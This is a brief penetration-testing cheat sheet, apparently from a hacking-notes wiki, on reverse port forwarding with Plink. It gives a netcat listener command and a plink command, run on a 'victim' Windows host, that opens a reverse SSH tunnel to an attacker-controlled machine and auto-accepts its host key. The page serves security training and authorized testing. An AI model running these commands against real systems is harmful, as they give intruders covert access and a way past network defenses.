---
description: Port Forwarding using Plink
---

# Plink

## Port Forwarding using Plink <a href="#port-forwarding-using-plink" id="port-forwarding-using-plink"></a>

Plink is a Windows command line version of the PuTTY SSH client.

### Reverse Connection <a href="#reverse-connection" id="reverse-connection"></a>

#### 1. Open Lisnter in Your Local Machine <a href="#id-1-open-lisnter-in-your-local-machine" id="id-1-open-lisnter-in-your-local-machine"></a>

```shellscript
nc -lvnp 4444
```

#### 2. Run Reverse Connection in Target Machine <a href="#id-2-run-reverse-connection-in-target-machine" id="id-2-run-reverse-connection-in-target-machine"></a>

First of all, generate SSH keys. Two keys (public and private) will be generated.

```shellscript
ssh-keygen
```

Convert the private key for Windows.

```shellscript
puttygen private_key -o private_key.ppk
```

Run reverse connection using plink.

```shellscript
cmd.exe /c echo y | .\plink.exe -R <attack-port>:<victim-ip>:<victim-port> attacker@<attack-ip> -i private_key.ppk -N
```
